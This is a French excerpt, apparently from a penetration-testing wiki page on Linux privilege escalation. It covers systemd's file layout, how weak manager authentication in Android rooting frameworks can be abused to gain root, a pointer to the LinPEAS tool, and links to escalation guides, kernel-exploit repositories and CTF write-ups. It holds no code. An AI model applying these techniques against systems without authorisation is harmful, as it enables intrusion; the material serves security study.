**systemd** apparaît comme un gestionnaire moderne d’initialisation et de services, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion de l’automount et les instantanés de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et dans `/etc/systemd/system/` pour les modifications des administrateurs, simplifiant ainsi l’administration du système.<sup>[[21]](#references)</sup>
...
## Frameworks de rooting Android : abus du canal manager

Les frameworks de rooting Android hookent couramment un syscall afin d’exposer des fonctionnalités privilégiées du kernel à un manager en userspace. Une authentification faible du manager (par exemple, des vérifications de signature basées sur l’ordre des FD ou de mauvais schémas de mots de passe) peut permettre à une application locale d’usurper l’identité du manager et d’obtenir les privilèges root sur des appareils déjà rootés. Pour en savoir plus et consulter les détails de l’exploitation :
...
### **Meilleur outil pour rechercher les vecteurs d’élévation de privilèges locale sous Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
...
- [1] [0xdf – HTB Planning (élévation de privilèges via Crontab UI, réutilisation de credentials zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
...
- [5] [Élévation de privilèges Linux de base](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guide de l’élévation de privilèges Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attaquer et défendre : techniques d’élévation de privilèges Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
...
- [9] [Sudo (LD_PRELOAD) (élévation de privilèges Linux)](https://touhidshaikh.com/blog/?p=827)
...
- [11] [frizb/Linux-Privilege-Escalation : conseils et astuces pour l’élévation de privilèges Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i : outil d’énumération et d’élévation de privilèges](https://github.com/rtcrowley/linux-private-i)
...
- [16] [Accéder au D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Exécutables SUID et élévation de privilèges Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo partie 2 – élévation de privilèges Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Comment gérer les ACL sous Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root Redhat/CentOS via network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
...
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + élévation de privilèges via lien symbolique TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copie cron pg_basebackup → Bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
...
- [33] [issue #74 de polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
